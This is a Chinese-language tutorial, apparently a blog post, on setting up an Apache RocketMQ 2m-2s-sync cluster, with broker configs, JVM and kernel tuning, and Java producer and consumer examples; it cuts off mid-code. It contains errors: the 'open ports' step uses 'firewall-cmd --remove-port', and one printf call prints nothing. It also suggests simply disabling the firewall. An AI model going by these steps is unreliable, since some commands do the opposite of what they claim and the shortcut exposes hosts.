runserver.sh\n\n参考设置：\n## 测试* 发送消息```sh# 设置环境变量export NAMESRV_ADDR=localhost:9876# 使用安装包的Demo发送消息bin/tools.sh org.apache.rocketmq.example.quickstart.Producer\n\n\n接收消息\n\n# 设置环境变量export NAMESRV_ADDR=localhost:9876# 2.接收消息bin/tools.sh org.apache.rocketmq.example.quickstart.Consumer\n\n关闭RocketMQ# 关闭NameServerbin/mqshutdown namesrv# 关闭Brokerbin/mqshutdown broker\n\nRocketMQ集群搭建集群特点\nNameServer是一个几乎无状态节点，可集群部署，节点之间无任何信息同步。\n\nBroker部署相对复杂，Broker分为Master(主)与Slave(从)，一个Master可以对应多个Slave，但是一个Slave只能对应一个Master，Master与Slave的对应关系通过指定相同的BrokerName，不同的BrokerId来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。每个Broker与NameServer集群中的所有节点建立长连接，定时注册Topic信息到所有NameServer。\n\nProducer与NameServer集群中的其中一个节点（随机选择）建立长连接，定期从NameServer取Topic路由信息，并向提供Topic服务的Master建立长连接，且定时向Master发送心跳。Producer完全无状态，可集群部署。\n\nConsumer与NameServer集群中的其中一个节点（随机选择）建立长连接，定期从NameServer取Topic路由信息，并向提供Topic服务的Master、Slave建立长连接，且定时向Master、Slave发送心跳。Consumer既可以从Master订阅消息，也可以从Slave订阅消息，订阅规则由Broker配置决定。\n\n\n集群模式在RocketMQ解压目录的conf文件夹中，可以看到三个文件夹，它们分别对应不同的集群模式：\n\n2m-2s-async : 双主双从异步模式\n2m-2s-sync : 双主双从同步模式\n2m-noslave : 多Master模式\n\n单Master模式这种方式风险较大，一旦Broker重启或者宕机时，会导致整个服务不可用。不建议线上环境使用,可以用于本地测试。\n多Master模式一个集群无Slave，全是Master，例如2个Master或者3个Master，这种模式的优缺点如下：\n\n优点：配置简单，单个Master宕机或重启维护对应用无影响，在磁盘配置为RAID10时，即使机器宕机不可恢复情况下，由于RAID10磁盘非常可靠，消息也不会丢（异步刷盘丢失少量消息，同步刷盘一条不丢），性能最高。\n缺点：单台机器宕机期间，这台机器上未被消费的消息在机器恢复之前不可订阅，消息实时性会受到影响。\n\n多Master多Slave模式（异步）每个Master配置一个Slave，有多对Master-Slave，HA(消息从Master拷贝至Slave)采用异步复制方式，主备有短暂消息延迟（毫秒级），这种模式的优缺点如下：\n\n优点：即使磁盘损坏，消息丢失的非常少，且消息实时性不会受影响，同时Master宕机后，消费者仍然可以从Slave消费，而且此过程对应用透明，不需要人工干预，性能同多Master模式几乎一样。\n缺点：Master宕机，磁盘损坏情况下会丢失少量消息。\n\n多Master多Slave模式（同步）每个Master配置一个Slave，有多对Master-Slave，HA采用同步双写方式，即只有主备都写成功，才向应用返回成功，这种模式的优缺点如下：\n\n优点：数据与服务都无单点故障，Master宕机情况下，消息无延迟，服务可用性与数据可用性都非常高。\n缺点：性能比异步复制模式略低（大约低10%左右），发送单个消息的耗时会略高，且目前版本在主节点宕机后，备机不能自动切换为主机。\n\n双主双从集群搭建本文我们搭建双主双从同步模式的集群，即2m-2s-sync。\n总体架构2m-2s-sync的架构图如下所示：\n\n集群工作流程\n启动NameServer，NameServer起来后监听端口，等待Broker、Producer、Consumer连上来，相当于一个路由控制中心。\nBroker启动，跟所有的NameServer保持长连接，定时发送心跳包。心跳包中包含当前Broker信息(IP+端口等)以及存储所有Topic信息。注册成功后，NameServer集群中就有Topic跟Broker的映射关系。\n收发消息前，先创建Topic，创建Topic时需要指定该Topic要存储在哪些Broker上，也可以在发送消息时自动创建Topic。\nProducer发送消息，启动时先跟NameServer集群中的其中一台建立长连接，并从NameServer中获取当前发送的Topic存在哪些Broker上，轮询从队列列表中选择一个队列，然后与队列所在的Broker建立长连接从而向Broker发消息。\nConsumer跟Producer类似，跟其中一台NameServer建立长连接，获取当前订阅Topic存在哪些Broker上，然后直接跟Broker建立连接通道，开始消费消息。\n\n服务器环境本次我们使用两台服务器搭建2m-2s-sync集群，每台服务器上的集群角色如下：\n\n\n\n序号\nIP\n角色\n架构模式\n\n\n\n1\n192.168.74.77\nnameserver、brokerserver\nMaster1、Slave2\n\n\n2\n192.168.74.88\nnameserver、brokerserver\nMaster2、Slave1\n\n\n添加信息修改hosts文件：\nvim /etc/hosts\n\n添加如下配置：\n# nameserver192.168.74.77 rocketmq-nameserver1192.168.74.88 rocketmq-nameserver2# broker192.168.74.77 rocketmq-master1192.168.74.77 rocketmq-slave2192.168.74.88 rocketmq-master2192.168.74.88 rocketmq-slave1\n\n配置完成后, 重启网卡：\nsystemctl restart network\n\n防火墙配置宿主机需要远程访问虚拟机的rocketmq服务和web服务，需要开放相关的端口号，简单粗暴的方式是直接关闭防火墙：\n# 关闭防火墙systemctl stop firewalld.service # 查看防火墙的状态firewall-cmd --state # 禁止firewall开机启动systemctl disable firewalld.service\n\n或者为了安全，只开放特定的端口号，RocketMQ默认使用3个端口：9876 、10911 、11011 。如果防火墙没有关闭的话，那么防火墙就必须开放这些端口：\n\nnameserver 默认使用 9876 端口\nmaster 默认使用 10911 端口\nslave 默认使用11011 端口\n\n执行以下命令：\n# 开放name server默认端口firewall-cmd --remove-port=9876/tcp --permanent# 开放master默认端口firewall-cmd --remove-port=10911/tcp --permanent# 开放slave默认端口 (当前集群模式可不开启)firewall-cmd --remove-port=11011/tcp --permanent # 重启防火墙firewall-cmd --reload\n\n环境变量配置编辑profile文件：\nvim /etc/profile\n\n在末尾加入如下命令：\n#rocketmqROCKETMQ_HOME=/usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-releasePATH=$PATH:$ROCKETMQ_HOME/binexport ROCKETMQ_HOME PATH\n\n保存并退出后， 通过如下命令使配置生效：\nsource /etc/profile\n\n创建消息存储路径mkdir /usr/local/rocketmq4.4.0/storemkdir /usr/local/rocketmq4.4.0/store-amkdir /usr/local/rocketmq4.4.0/store-b\n\nbroker配置文件master1master1在服务器192.168.74.77上，对应broker-a：\nvi /usr/local/rocketmq/conf/2m-2s-sync/broker-a.properties\n\n修改配置如下：\n#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，同一个组broker的名字相同brokerName=broker-a#0 表示 Master，&gt;0 表示 SlavebrokerId=0#nameServer地址，分号分割namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876#在发送消息时，每个Topic默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker的ip地址brokerIP1=192.168.74.77#Broker 对外服务的监听端口listenPort=10911#删除文件时间点，默认凌晨 4点deleteWhen=04#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径（同一台服务器上的多个broker不能相同）storePathRootDir=/usr/local/rocketmq4.4.0/store-a#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq4.4.0/store/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq4.4.0/store/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SYNC_MASTER#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=SYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128#允许消息过滤enablePropertyFilter=true\n\nslave2slave2在服务器192.168.74.77上，对应broker-b-s：\nvi /usr/local/rocketmq/conf/2m-2s-sync/broker-b-s.properties\n\n修改配置如下：\n#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，同一个组broker的名字相同brokerName=broker-b#0 表示 Master，&gt;0 表示 SlavebrokerId=1#nameServer地址，分号分割namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876#在发送消息时，每个Topic默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker的ip地址brokerIP1=192.168.74.77#Broker 对外服务的监听端口listenPort=11011#删除文件时间点，默认凌晨 4点deleteWhen=04#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径（同一台服务器上的多个broker不能相同）storePathRootDir=/usr/local/rocketmq4.4.0/store-b#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq4.4.0/store/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq4.4.0/store/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SLAVE#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=ASYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128#允许消息过滤enablePropertyFilter=true\n\nmaster2master2在服务器192.168.74.88上，对应broker-b：\nvi /usr/local/rocketmq/conf/2m-2s-sync/broker-b.properties\n\n修改配置如下：\n#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，同一个组broker的名字相同brokerName=broker-b#0 表示 Master，&gt;0 表示 SlavebrokerId=0#nameServer地址，分号分割namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876#在发送消息时，每个Topic默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker的ip地址brokerIP1=192.168.74.88#Broker 对外服务的监听端口listenPort=10911#删除文件时间点，默认凌晨 4点deleteWhen=04#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径（同一台服务器上的多个broker不能相同）storePathRootDir=/usr/local/rocketmq4.4.0/store-b#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq4.4.0/store/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq4.4.0/store/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SYNC_MASTER#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=SYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128#允许消息过滤enablePropertyFilter=true\n\nslave1slave1在服务器192.168.74.88上，对应broker-a-s：\nvi /usr/local/rocketmq/conf/2m-2s-sync/broker-a-s.properties\n\n修改配置如下：\n#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，同一个组broker的名字相同brokerName=broker-a#0 表示 Master，&gt;0 表示 SlavebrokerId=1#nameServer地址，分号分割namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876#在发送消息时，每个Topic默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker的ip地址brokerIP1=192.168.74.88#Broker 对外服务的监听端口listenPort=11011#删除文件时间点，默认凌晨 4点deleteWhen=04#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径（同一台服务器上的多个broker不能相同）storePathRootDir=/usr/local/rocketmq4.4.0/store-a#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq4.4.0/store/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq4.4.0/store/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=SLAVE#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=ASYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128#允许消息过滤enablePropertyFilter=true\n\n修改启动脚本文件runbroker.shvi /usr/local/rocketmq/bin/runbroker.shBash# 开发环境配置 JVM ConfigurationJAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -server -Xms256m -Xmx256m -Xmn128m&quot;\n\nrunserver.shvim /usr/local/rocketmq/bin/runserver.shBashJAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -server -Xms256m -Xmx256m -Xmn128m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m&quot;\n\n服务启动启动NameServe集群分别在192.168.74.77和192.168.74.88启动NameServer：\nnohup mqnamesrv &amp;\n\n启动Broker集群\n在192.168.74.77上启动master1和slave2\n\n启动master1并指定配置文件：\nnohup mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-sync/broker-a.properties &amp;\n\n启动slave2并指定配置文件：\nnohup mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-sync/broker-b-s.properties &amp;\n\n\n在192.168.74.88上启动master2和slave2\n\n启动master2并指定配置文件：\nnohup mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-sync/broker-b.properties &amp;\n\n启动slave1并指定配置文件：\nnohup mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-sync/broker-a-s.properties &amp;\n\n查看进程状态启动后通过JPS查看启动进程：\n每台服务器应该有两个broker和一个nameServer在运行。\n查看日志# 查看nameServer日志tail -500f ~/logs/rocketmqlogs/namesrv.log# 查看broker日志tail -500f ~/logs/rocketmqlogs/broker.log\n\n参数配置到这里整个RocketMQ的集群服务就搭建完成了。但是在实际使用时，我们说RocketMQ的吞吐量、性能都很高，那要发挥RocketMQ的高性能，还需要对RocketMQ以及服务器的性能进行定制：\nJVM参数之前提到过，在runserver.sh中需要定制nameserver的内存大小，在runbroker.sh中需要定制broker的内存大小。这些默认的配置可以认为都是经过检验的最优化配置，但是在实际情况中都还需要根据服务器的实际情况进行调整：\n\nrunbroker.sh中的配置如下\n\nJAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -server -Xms256m -Xmx256m -Xmn128m&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:+UseG1GC -XX:G1HeapRegionSize=16m -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -XX:SoftRefLRUPolicyMSPerMB=0&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -verbose:gc -Xloggc:/dev/shm/mq_gc_%p.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime -XX:+PrintAdaptiveSizePolicy&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=30m&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:-OmitStackTraceInFastThrow&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:+AlwaysPreTouch&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:MaxDirectMemorySize=15g&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:-UseLargePages -XX:-UseBiasedLocking&quot;\n\n可以看到对于broker来说：\n\n-XX:+UseG1GC参数指定使用G1垃圾收集器\n-XX:G1HeapRegionSize=16m参数将G1的region块大小设为16M\n-XX:G1ReservePercent=25表示在G1的老年代中预留25%空闲内存，这个默认值是10%，RocketMQ把这个参数调大了。\n-XX:InitiatingHeapOccupancyPercent=30表示当堆内存的使用率达到30%之后就会启动G1垃圾回收器尝试回收垃圾，默认值是45%，RocketMQ把这个参数调小了。\n\n\nrunserver.sh中的配置如下\n\nJAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -server -Xms256m -Xmx256m -Xmn128m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:+UseConcMarkSweepGC -XX:+UseCMSCompactAtFullCollection -XX:CMSInitiatingOccupancyFraction=70 -XX:+CMSParallelRemarkEnabled -XX:SoftRefLRUPolicyMSPerMB=0 -XX:+CMSClassUnloadingEnabled -XX:SurvivorRatio=8  -XX:-UseParNewGC&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -verbose:gc -Xloggc:/dev/shm/rmq_srv_gc.log -XX:+PrintGCDetails&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125; -XX:-OmitStackTraceInFastThrow&quot;JAVA_OPT=&quot;$&#123;JAVA_OPT&#125;  -XX:-UseLargePages&quot;\n\n对于nameserver来说：\n\n-XX:+UseConcMarkSweepGC参数指定使用CMS垃圾收集器\n-XX:+UseCMSCompactAtFullCollection参数指定GC后对内存进行压缩整理\n-XX:CMSInitiatingOccupancyFraction=70参数当老年代内存使用达到70%时会触发Full GC，默认为92%，RocketMQ把这个参数调小了。\n-XX:+CMSParallellnitialMarkEnabled参数表示在初始标记的时候多线程执行，缩短停顿时间。\n\n也就是说RocketMQ提高了GC的频率，但是避免了垃圾对象过多，一次垃圾回收时间太长的问题。\nLinux内核参数在部署RocketMQ的时候，还可以对Linux内核参数进行一定的定制。例如：\n\nulimit：需要进行大量的网络通信和磁盘IO。\nvm.extra_free_kbytes：告诉VM在后台回收（kswapd）启动的阈值与直接回收（通过分配进程）的阈值之间保留额外的可用内存。RocketMQ使用此参数来避免内存分配中的长延迟。（与具体内核版本相关）\nvm.min_free_kbytes：如果将其设置为低于1024KB，将会巧妙的将系统破坏，并且系统在高负载下容易出现死锁。\nvm.max_map_count：限制一个进程可能具有的最大内存映射区域数。RocketMQ将使用mmap加载CommitLog和ConsumeQueue，因此建议将为此参数设置较大的值。\nvm.swappiness：定义内核交换内存页面的积极程度。较高的值会增加攻击性，较低的值会减少交换量。建议将值设置为10来避免交换延迟。\nFile descriptor limits：RocketMQ需要为文件（CommitLog和ConsumeQueue）和网络连接打开文件描述符。建议设置文件描述符的值为655350。\n\n\n这些参数在CentOS7中的配置文件都在/proc/sys/vm目录下。另外，RocketMQ的bin目录下有个os.sh里面设置了RocketMQ建议的系统内核参数，可以根据情况进行调整。\n\n消息发送模式搭建完了集群，下面我们就开始写消息收发的代码，研究RocketMQ的工作模式。\n准备工作\n导入MQ客户端依赖\n\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;    &lt;artifactId&gt;rocketmq-client&lt;/artifactId&gt;    &lt;version&gt;4.4.0&lt;/version&gt;&lt;/dependency&gt;\n\n\n消息发送者步骤分析\n\n1.创建消息生产者producer，并制定生产者组名2.指定Nameserver地址3.启动producer4.创建消息对象，指定主题Topic、Tag和消息体（一个Topic可以有多个Tag）5.发送消息6.关闭生产者producer\n\nRocketMQ中Topic和Tag的关系，就相当于RabbitMQ中Exchange和routingKey的关系。\n\n消息消费者步骤分析\n\n1.创建消费者Consumer，制定消费者组名2.指定Nameserver地址3.订阅主题Topic和Tag4.设置回调函数，处理消息5.启动消费者consumer\n\n每个消费组都消费主题中一份完整的消息，不同消费组之间消费进度彼此不受影响。\n也就是说，在负载均衡模式下，一条消息被Group1消费过，也会再给Group2消费。\n而消费组中包含多个消费者，同一个组内的消费者是竞争消费的关系，每个消费者负责消费组内的一部分消息，也就是说如果一条消息被Consumer1消费了，那同组的其他消费者就不会再收到这条消息。\n简单的组内消费是单例，组外消费是共享。\n基本消息消息发送发送同步消息发送后线程阻塞，直到mq响应。这种可靠性同步地发送方式使用的比较广泛，比如：重要的消息通知，短信通知。\npublic class SyncProducer &#123;\tpublic static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();    \tfor (int i = 0; i &lt; 10; i++) &#123;    \t    // 创建消息，并指定Topic，Tag和消息体    \t    Message msg = new Message(&quot;topic1&quot;,&quot;tag1&quot;,(&quot;Hello RocketMQ &quot; + i).getBytes());        \t// 发送同步消息            SendResult sendResult = producer.send(msg);            // 通过sendResult返回消息是否成功送达            System.out.printf(&quot;发送结果&quot;, sendResult);    \t&#125;t    \t// 如果不再发送消息，关闭Producer实例。    \tproducer.shutdown();    &#125;&#125;\n\n发送异步消息异步消息就是不等待mq响应，之后mq会调用一个回调方法。通常用在对响应时间敏感的业务场景，即发送端不能容忍长时间地等待Broker的响应：\npublic class AsyncProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者                producer.start();        for (int i = 0; i &lt; 3; i++) &#123;            // 创建消息            Message message = new Message(&quot;topic1&quot;, &quot;tag2&quot;, (&quot;消息&quot; + i).getBytes());            // 发送异步消息            producer.send(message, new SendCallback() &#123;                // 发送成功回调方法                @Override                public void onSuccess(SendResult sendResult) &#123;                    System.out.println(&quot;发送结果：&quot; + sendResult);                &#125;                // 发送失败回调方法                @Override                public void onException(Throwable throwable) &#123;                    throwable.printStackTrace();                &#125;            &#125;);            // 线程休眠2s（必要）            TimeUnit.SECONDS.sleep(2);        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n注意：发送异步消息时，线程休眠两秒是必要的。因为如果线程不等待，生产者发送完消息就会直接关闭，这样mq就无法调用其回调方法，会报错。\n当然也可以使用CountDownLatch来等待完成。\n单向发送消息这种方式mq不会返回消息发送的结果，主要用在不特别关心发送结果的场景，例如日志发送。\npublic class OneWayProducer &#123;    public static void main(String[] args) throws Exception &#123;        // 创建生产者，指定生产组名称        DefaultMQProducer producer = new DefaultMQProducer(&quot;group1&quot;);        // 设置nameSrv地址        producer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动生产者        producer.start();        for (int i = 0; i &lt; 6; i++) &#123;            Message message = new Message(&quot;topic1&quot;, &quot;tag3&quot;, (&quot;消息&quot; + i).getBytes());                        // 使用sendOneway方法发送单向消息            producer.sendOneway(message);        &#125;        // 发送消息结束，关闭Producer实例。        producer.shutdown();    &#125;&#125;\n\n消息消费推模式与拉模式RocketMQ中消费者消费消息有两种模式\n一种是消费者主动去Broker上拉取消息的拉模式，另一种是消费者等待Broker把消息推送过来的推模式。\n推模式的样例见：org.apache.rocketmq.example.simple.PushConsumer\n\n推模式的消费者实现类是DefaultMQPushConsumer，后面的代码中我们用的都是推模式，这种模式比较简单，只需要注册监听器监听MQ推送来的消息即可。\n拉模式的消费者实现类是DefaultMQPullConsumer，它的用法如下：\n\npublic class PullConsumer &#123;        // 用于保存MessageQueue队列的偏移量    private static final Map&lt;MessageQueue, Long&gt; OFFSE_TABLE        = new HashMap&lt;MessageQueue, Long&gt;();    public static void main(String[] args) throws MQClientException &#123;        // 创建拉模式消费者DefaultMQPullConsumer        DefaultMQPullConsumer consumer             = new DefaultMQPullConsumer(&quot;group1&quot;);        // 设置nameserver地址        consumer.setNamesrvAddr(&quot;192.168.74.77:9876;192.168.74.88:9876&quot;);        // 启动消费者        consumer.start();        // 根据需要订阅的主题，拿到主题所有的MessageQueue        Set&lt;MessageQueue&gt; mqs = consumer.fetchSubscribeMessageQueues(&quot;topic1&quot;);        // 遍历所有MessageQueue        for (MessageQueue mq : mqs) &#123;            System.out.printf(&quot;Consume from the queue: %s%n&quot;, mq);            SINGLE_MQ:            while (true) &#123;                try &#123;                    /** 通过pullBlockIfNotFound方法从队列中拉取消息                     *  参数1：MessageQueue队列                     *  参数2：用于匹配需要订阅的消息的Tag                     *  参数3：MessageQueue队列的偏移量，表示从哪开始消费                     *  参数4：每次最多拉取多少消息                     */                    // 注意拉取到消息后，消息仍然在队列中，不会被删除                    PullResult pullResult =                        consumer.pullBlockIfNotFound(mq, null, getMessageQueueOffset(mq), 32);                    System.out.printf(&quot;%s%n&quot;, pullResult);                    // 将偏移量保存                    putMessageQueueOffset(mq, pullResult.getNextBeginOffset());                    // 判断结果状态                    switch (pullResult.getPullStatus()) &#123;                        case FOUND:                            break;                        case NO_MATCHED_MSG:                            break;                        case NO_NEW_MSG:                            break SINGLE_MQ;                        case OFFSET_ILLEGAL:                            break;                        default:                            break;                    &#125;                &#125; catch (Exception e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;        consumer.shutdown();    &#125;    // 获取MessageQueue的偏移量    private static long getMessageQueueOffset(MessageQueue mq) &#123;        Long offset = OFFSE_TABLE.get(mq);        if (offset != null)            return offset;        return 0;    &#125;        // 保存MessageQueue的偏移量    private static void putMessageQueueOffset(MessageQueue mq, long offset) &#123;        OFFSE_TABLE.put(mq, offset);    &#125;&#125;\n\n可以看到拉模式比较复杂，需要我们自己从Broker上获取队列拉取消息，并且还需要管理消息队列的偏移量。但实际上RocketMQ的推模式也是由拉模式封装出来的。\n\n新版本中DefaultMQPullConsumer这个消费者类已标记为过期，但是还是可以使用的。替换的类是DefaultLitePullConsumer，它简化了老版本拉模式的代码：\npublic class LitePullConsumerSubscribe &#123;public static volatile boolean running = true;public static void main(String[] args) throws Exception &#123;  // 创建拉模式消费者DefaultLitePullConsumer  DefaultLitePullConsumer litePullConsumer      = new DefaultLitePullConsumer(&quot;group1&quot;);  // 订阅主题  litePullConsumer.subscribe(&quot;topic1&quot;, &quot;*&quot;);  // 启动消费者  litePullConsumer.start();  try &#123;      while (running) &#123;          // 从mq中主动拉取消息          List&lt;MessageExt&gt; messageExts = litePullConsumer.poll();          System.out.printf(&quot;%s%n&quot;, messageExts);      &#125;  &#125; finally &#123;      litePullConsumer.shutdown();  &#125;&#125;&#125;\n\n除了这种简单的拉模式，新版本中仍然提供了一种可以自己管理偏移量和队列的拉取消息方式：\npublic class LitePullConsumerAssign &#123; public static volatile boolean running = true; public static void main(String[] args) throws Exception &#123;     // 创建拉模式消费者DefaultLitePullConsumer     DefaultLitePullConsumer litePullConsumer          = new DefaultLitePullConsumer(&quot;group1&quot;);     // 关闭自动提交     litePullConsumer.setAutoCommit(false);     // 开启消费者     litePullConsumer.start();     // 根据需要订阅的主题，拿到主题所有的MessageQueue     Collection&lt;MessageQueue&gt; mqSet         = litePullConsumer.fetchMessageQueues(&quot;topic1&quot;);     List&lt;MessageQueue&gt; list = new ArrayList&lt;&gt;(mqSet);     List&lt;MessageQueue&gt; assignList = new ArrayList&lt;&gt;();     // 示例中取主题一半的MessageQueue     for (int i = 0; i &lt; list.size() / 2; i++) &#123;         assignList.add(list.get(i));     &#125;     // 绑定队列     litePullConsumer.assign(assignList);     // 从指定的队列和偏移量开始拉取消息     litePullConsumer.seek(assignList.get(0), 10);     try &#123;         while 